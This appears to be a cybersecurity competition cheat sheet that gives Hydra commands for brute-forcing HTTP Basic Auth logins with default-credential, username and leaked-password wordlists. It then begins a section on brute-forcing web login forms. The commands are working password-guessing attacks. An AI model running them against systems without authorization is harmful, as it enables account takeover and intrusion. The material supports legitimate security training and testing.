<[Back to Main Page](https://github.com/ChristopherFitzsimons/WorldSkills2022Cybersecurity)

# Login Brue Forcing
Creared by Bujitha Ponsuge

## Brute Forcing Login Forms

# Commands
The Following are commands that you can use with Hydra to brute force an Basic HTTP Auth Form

## Brute Forcing Using Default Credentials using Hydra
|	Options		|	Description	|
|-----------|:-----------|
|<font color=red>-C </font>|Allows to use Combined Wordlists|
|<font color=red>http-get</font>|	This is the Request Method						|
|<font color=red>/</font> | The Target Path

Combined Wordlist

```console
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <Target IP> -s <PORT> http-get /
```

Username/Password Brute Force

```console
hydra -L /usr/share/SecLists/Usernames/Names/names.txt -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f Target IP> -s <PORT> http-get /
```

Username Brute Force

```console
hydra -L /usr/share/SecLists/Usernames/Names/names.txt -p <PASSWORD> -u -f Target IP> -s <PORT> http-get /
```

Password Brute Force

```console
hydra -l <USERNAME> -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f Target IP> -s <PORT> http-get /
```

# Web Forms/Login Forms Brute Forcing using **Hydra**

Following Commands are usefull to brute force Login Forms (Admin Panels etc..) using the Hydra Module <font color=lightgreen> **http[s]-post-form**</font> 

> To Determine if the **http[s]-post-form** is the correct module to use. Type something into the login form and check if the URL has any of the inputs that you put in or if the URL change in anyway, If the URL does not change then the Web Application will be using an POST form. If the URL change and or have any of our inputs then its an GET form.
> 

